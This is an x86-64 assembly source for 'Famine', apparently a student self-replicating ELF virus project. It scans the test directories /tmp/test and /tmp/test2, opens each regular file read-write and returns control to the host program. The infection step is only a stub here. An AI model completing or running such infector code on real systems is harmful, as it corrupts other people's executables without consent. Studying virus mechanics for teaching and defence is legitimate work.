%include "./famine.inc"

section			.text
global			_start

_host:
	mov rax, _exit
	syscall

_start:
	push rdi
	push rsi
	push rcx
	push rdx
	push rbp

	mov rbp, rsp
	sub rbp, famine_size
	lea rax, [rel _start]
	mov rdx, [rel virus_entry]
	sub rax, rdx
	add rax, [rel host_entry]
	push rax
	lea rdi, [rel infect_dir]

.opendir:
	mov r14, rdi
	mov rsi, O_RDONLY | O_DIRECTORY
	mov rax, _open
	syscall
	test eax, eax
	jl .nextdir
	mov STACK(famine.dir_fd), rax

.readdir:
	mov rdx, DIRENT_ARR_SIZE
	lea rsi, STACK(famine.dirents)
	mov rdi, rax
	mov rax, _getdents
	syscall
	test rax, rax
	jle .closedir
	xor r13, r13
	mov r12, rax

.file:

	lea rdi, STACK(famine.dirents)
	add rdi, r13
	movzx edx, word[rdi + dirent.d_reclen]
	mov al, byte[rdi + rdx - 1]
	add rdi, dirent.d_name
	add r13, rdx
	cmp al, DT_REG
	jne .nextfile
	call process



.nextfile:
	cmp r13, r12
	jl .file
	jmp .readdir

.closedir:
	mov rdi, STACK(famine.dir_fd)
	mov rax, _close
	syscall

.nextdir:
	xor ecx, ecx
	mul ecx
	dec ecx
	mov rdi, r14
	repnz scasb
	cmp byte[rdi], 0
	jnz .opendir
	pop rax
	pop rbp
	pop rdx
	pop rcx
	pop rsi
	pop rdi
	jmp rax

process:
	mov rsi, r14
	mov rax, rdi
	lea rdi, STACK(famine.file_path)
	mov rdx, rdi

.dirname:
	movsb
	cmp byte [rsi], 0
	jnz .filename
	mov rsi, rax
	

.filename:
	movsb
	cmp byte[rsi -1], 0
	jnz .filename
	mov rdi, rdx

	mov rsi, O_RDWR
	mov rax, _open
	syscall
	
	test eax, eax
	jl .return

.return:
ret

infect_dir			db			"/tmp/test",0,"/tmp/test2/",0,0
signature			db			'Famine version 99.0 (c)oded by  <araout>'
virus_entry			dq			_start
host_entry			dq			_host
_finish:
